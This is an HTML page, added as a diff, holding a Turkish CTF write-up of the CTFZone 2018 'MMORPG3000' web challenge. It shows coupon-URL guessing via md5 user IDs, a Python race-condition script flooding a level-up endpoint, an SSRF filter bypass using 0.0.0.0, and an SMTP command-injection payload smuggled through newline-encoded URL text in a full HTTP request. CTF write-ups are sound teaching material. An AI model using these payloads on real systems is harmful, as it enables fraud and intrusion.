@@ -1,0 +1,157 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html {
+      max-width: 70ch;
+      margin: auto;
+      line-height: 1.75;
+      font-size: 1.25em;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    nav ul {
+      background: #faca46;
+      text-align: center;
+    }
+
+    nav ul li {
+      display: inline-block;
+      color: white;
+      margin-right: 10px;
+    }
+
+    nav ul li a {
+      text-decoration: none;
+    }
+
+    img {
+      width: 100%;
+    }
+  </style>
+</head>
+
+<nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="https://github.com/i64">Git</a></li>
+  </ul>
+</nav><h1>MMORPG3000 - CTFZone 2018</h1>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">Here is a new generation mmorpg game, where you can beat your friends, just finished crowdfunding campaign and available on your PC starting today. It&#39;s a bit buggy, but you know...
+</span><span style="color:#657b83;">I heard that developers of this game are really greedy.
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/game/battle/competitors/
+</span>
+</code></pre>
+<p>Verilen linke tikladigimizda assagidaki sayfa goruluyor.</p>
+<p><img src="1.png" alt="" />
+Sunulan bedava kuponu almak uzere donate sayfasini gittik.</p>
+<p><img src="2.png" alt="" /></p>
+<p>Verilen hediye kuponu girdikten sonra assagidaki resim ile karsilastik.</p>
+<p><img src="3.png" alt="" /></p>
+<p>Resimin <strong>URL</strong>'si şu şekilde;</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_aa2a77371374094fe9e0bc1de3f94ed9.png
+</span>
+</code></pre>
+<p><strong>coupon_aa2a77371374094fe9e0bc1de3f94ed9</strong> urlin suffixi userid'in md5li hali oldugunu farkettik ve baska bir sayinin md5'ini alip denedik.</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/storage/img/coupon_6a81681a7af700c6385d36577ebec359.png
+</span>
+</code></pre>
+<p><img src="4.png" alt="" /></p>
+<p>Kuponlar ile level atlattik fakat level 30'un otesine kuponlar ile gecilmiyormus. Bir umit <strong>Race Condition</strong> vardir diye umit ettik ve denedik.</p>
+<p><img src="5.png" alt="" /></p>
+<pre lang="python" style="background-color:#fdf6e3;"><code>
+<span style="color:#cb4b16;">import </span><span style="color:#657b83;">asyncio
+</span><span style="color:#cb4b16;">from </span><span style="color:#657b83;">aiohttp </span><span style="color:#cb4b16;">import </span><span style="color:#657b83;">ClientSession
+</span><span style="color:#657b83;">
+</span><span style="color:#586e75;">async </span><span style="color:#859900;">def </span><span style="color:#b58900;">fetch</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">url</span><span style="color:#657b83;">, </span><span style="color:#268bd2;">session</span><span style="color:#657b83;">):
+</span><span style="color:#657b83;">    </span><span style="color:#586e75;">async </span><span style="color:#859900;">with </span><span style="color:#657b83;">session.</span><span style="color:#b58900;">get</span><span style="color:#657b83;">(url) </span><span style="color:#859900;">as </span><span style="color:#657b83;">response:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">return await </span><span style="color:#657b83;">response.</span><span style="color:#b58900;">read</span><span style="color:#657b83;">()
+</span><span style="color:#657b83;">
+</span><span style="color:#586e75;">async </span><span style="color:#859900;">def </span><span style="color:#b58900;">run</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">n</span><span style="color:#657b83;">):
+</span><span style="color:#657b83;">    sem = asyncio.</span><span style="color:#b58900;">Semaphore</span><span style="color:#657b83;">(n)
+</span><span style="color:#657b83;">    </span><span style="color:#586e75;">async </span><span style="color:#859900;">with </span><span style="color:#b58900;">ClientSession</span><span style="color:#657b83;">(</span><span style="color:#268bd2;">cookies</span><span style="color:#657b83;">={</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">session</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">: </span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">eyJ1aWQiOjgyOX0.DjeKvA.qA-vNIHjDFSPyuDwArZyGMQD984</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">}) </span><span style="color:#859900;">as </span><span style="color:#657b83;">session:
+</span><span style="color:#657b83;">        </span><span style="color:#859900;">await </span><span style="color:#657b83;">asyncio.</span><span style="color:#b58900;">gather</span><span style="color:#657b83;">(*(asyncio.</span><span style="color:#b58900;">ensure_future</span><span style="color:#657b83;">(</span><span style="color:#b58900;">fetch</span><span style="color:#657b83;">(</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one:80/donate/lvlup</span><span style="color:#839496;">&quot;</span><span style="color:#657b83;">, session)) </span><span style="color:#859900;">for </span><span style="color:#d33682;">_ </span><span style="color:#859900;">in range</span><span style="color:#657b83;">(n)))
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">number = </span><span style="color:#6c71c4;">10000
+</span><span style="color:#657b83;">loop = asyncio.</span><span style="color:#b58900;">get_event_loop</span><span style="color:#657b83;">()
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">future = asyncio.</span><span style="color:#b58900;">ensure_future</span><span style="color:#657b83;">(</span><span style="color:#b58900;">run</span><span style="color:#657b83;">(number))
+</span><span style="color:#657b83;">loop.</span><span style="color:#b58900;">run_until_complete</span><span style="color:#657b83;">(future)
+</span>
+</code></pre>
+<p>Ve 30'uncu leveli geçtik</p>
+<p><img src="6.png" alt="" /></p>
+<p>30'uncu leveli gectigimizden dolayı <strong>Avatar</strong> ekleme ozelligi aktif olmus oldu.</p>
+<p><img src="7.png" alt="" /></p>
+<p>Upload fonksiyonunda bir sey yoktu. Belki  <strong>SSRF</strong>'tir. <strong>127.0.0.1</strong> ve <strong>localhost</strong> engelliydi bu yüzden <strong>SSRF</strong> olgundan emin olduk. Ama <strong>0.0.0.0</strong> adresi calisiyordu. Port taramaya basladik.</p>
+<p><img src="8.png" alt="" /></p>
+<p><strong>25</strong>'ci port yani <strong>SMTP</strong> portu acikmis. <strong>Host</strong>'u manipüle ederek <strong>SMTP</strong>'yi kullanmayı denedik.</p>
+<pre style="background-color:#fdf6e3;" lang="smtp"><code>
+<span style="color:#657b83;">Host: [0.0.0.0
+</span><span style="color:#657b83;">helo 1v3m
+</span><span style="color:#657b83;">mail from:&lt;qaewjlfnwej@o3enzyme.com&gt;
+</span><span style="color:#657b83;">rcpt to:&lt;root&gt;
+</span><span style="color:#657b83;">data
+</span><span style="color:#657b83;">subject: give me flag
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">1v3m
+</span><span style="color:#657b83;">.
+</span><span style="color:#657b83;">]:25
+</span>
+</code></pre>
+<p>Yeni satır ayıracı <strong>SMTP</strong>'de delimiter olduğu için her satırın sonuna yeni satırın <strong>URL Encoded</strong> hali olan <strong>%0A</strong>'yı ekledik ve son payloadımızın son hali</p>
+<pre style="background-color:#fdf6e3;" lang="url"><code>
+<span style="color:#657b83;">[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
+</span>
+</code></pre>
+<p><strong>Request</strong>'imizin son hali şöyle oldu:</p>
+<pre lang="http" style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">POST /user/avatar HTTP/1.1
+</span><span style="color:#657b83;">Host: web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one
+</span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
+</span><span style="color:#657b83;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span style="color:#657b83;">Accept-Language: en-GB,en;q=0.5
+</span><span style="color:#657b83;">Accept-Encoding: gzip, deflate
+</span><span style="color:#657b83;">Referer: http://web-03.v7frkwrfyhsjtbpfcppnu.ctfz.one/user/avatar
+</span><span style="color:#657b83;">Content-Type: multipart/form-data; boundary=---------------------------4693211868403427471435307016
+</span><span style="color:#657b83;">Content-Length: 581
+</span><span style="color:#657b83;">Cookie: session=eyJ1aWQiOjgyN30.DjaSgA.ylhJXkstamQ7GahYWvUypKpvDQc
+</span><span style="color:#657b83;">DNT: 1
+</span><span style="color:#657b83;">Connection: close
+</span><span style="color:#657b83;">Upgrade-Insecure-Requests: 1
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">-----------------------------4693211868403427471435307016
+</span><span style="color:#657b83;">Content-Disposition: form-data; name=&quot;avatar&quot;; filename=&quot;&quot;
+</span><span style="color:#657b83;">Content-Type: application/octet-stream
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">-----------------------------4693211868403427471435307016
+</span><span style="color:#657b83;">Content-Disposition: form-data; name=&quot;url&quot;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">https://[0.0.0.0%0ahelo 1v3m%0amail from:&lt;qaewjlfnwej@o3enzyme.com&gt;%0arcpt to:&lt;root&gt;%0adata%0asubject: give me flag%0a%0a1v3m%0a.%0a]:25
+</span><span style="color:#657b83;">-----------------------------4693211868403427471435307016
+</span><span style="color:#657b83;">Content-Disposition: form-data; name=&quot;action&quot;
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">save
+</span><span style="color:#657b83;">-----------------------------4693211868403427471435307016--
+</span><span style="color:#657b83;">
+</span>
+</code></pre>
+<p>Flag mailimize geldi</p>
+<p><img src="9.png" alt="" /></p>
+<p>ve flag</p>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">ctfzone{1640392aaf27597150c97e04a99a6f08}
+</span>
+</code></pre>
+</html>
